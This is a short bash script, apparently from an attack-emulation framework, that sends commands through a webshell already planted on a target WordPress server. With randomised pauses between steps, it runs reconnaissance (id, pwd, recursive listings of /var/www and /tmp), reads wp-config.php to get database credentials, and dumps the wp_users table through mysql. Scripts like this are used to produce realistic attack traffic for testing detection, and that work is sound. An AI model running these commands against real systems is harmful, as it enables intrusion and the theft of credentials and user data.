#!/bin/bash

echo "Loading configs/$1"
source configs/$1

echo "Executing recon commands ..."
python3 util/shell.py exec $TARGET_WEBSHELL id

attack_wait $(shuf -i 0-20 -n 1)s

python3 util/shell.py exec $TARGET_WEBSHELL pwd

attack_wait $(shuf -i 0-20 -n 1)s

python3 util/shell.py exec $TARGET_WEBSHELL ls -laR /var/www

attack_wait $(shuf -i 0-20 -n 1)s

python3 util/shell.py exec $TARGET_WEBSHELL cat /var/www/$TARGET_INTERNAL_DOMAIN/wp-config.php

attack_wait $(shuf -i 0-20 -n 1)s

python3 util/shell.py exec $TARGET_WEBSHELL mysql -u $MYSQL_USER -p$MYSQL_PASSWORD $MYSQL_DB -e "'select * from wp_users'"

attack_wait $(shuf -i 0-20 -n 1)s

python3 util/shell.py exec $TARGET_WEBSHELL ls -laR /tmp/

echo "done."



